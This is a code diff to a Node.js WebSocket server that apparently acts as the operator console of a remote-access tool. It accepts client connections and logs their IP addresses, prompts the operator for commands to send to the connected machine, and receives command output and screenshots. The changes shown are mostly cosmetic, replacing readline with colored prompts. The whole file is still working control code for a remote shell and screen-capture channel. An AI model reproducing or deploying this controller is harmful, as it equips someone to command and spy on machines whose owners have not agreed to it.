@@ -1,12 +1,16 @@
-const WebSocket = require('ws');
-const readline = require('readline');
-const detectCharacterEncoding = require('detect-character-encoding');
-var next = "";
 
+const WebSocket = require('ws');
+const colors = require('colors');
+const prompt = require('prompt');
+const detectCharacterEncoding = require('detect-character-encoding');
+require('events').EventEmitter.setMaxListeners = 1;
+var next = "";
+prompt.start();
+var workingDir = "";
 const wss = new WebSocket.Server({ port: 4422 });
 
 wss.on('connection', function connection(ws) {
-	console.log("[+] Connected to client : " + ws._socket.remoteAddress.replace("::ffff:","") + " !");
+	console.log("[".white + "+".blue + "] Connected to client : ".white + ws._socket.remoteAddress.replace("::ffff:","").underline.green + " !");
 	ws.on('message', function incoming(message) {
     
     if(next == "screenshot"){
@@ -18,23 +22,18 @@ wss.on('connection', function connection(ws) {
 		});
     }
     else if(message.startsWith("hello")){
-    	var workingDir = message.substring(message.indexOf("##") + 2, message.lastIndexOf("##"));
-    	const rl = readline.createInterface({
-			input: process.stdin,
-			output: process.stdout
-		});
-    	rl.question(workingDir+">", (answer) => {
-  			ws.send(answer);
-			rl.close();
+    	workingDir = message.substring(message.indexOf("##") + 2, message.lastIndexOf("##"));
+    	prompt.get([{"description":workingDir.bold.white + "># ".bold.red}], function (err, result) {
+			ws.send(result.question);
 		});
     }else if(message.startsWith("##finish##")){
  		ws.send("#pwd");
     }
     else if(message == "##SCREENSHOT##"){
 		next = "screenshot";
-    }
-    else{
-    	console.log(message);
+    }else{
+		
+		console.log(message.grey);
     }
 
 	});
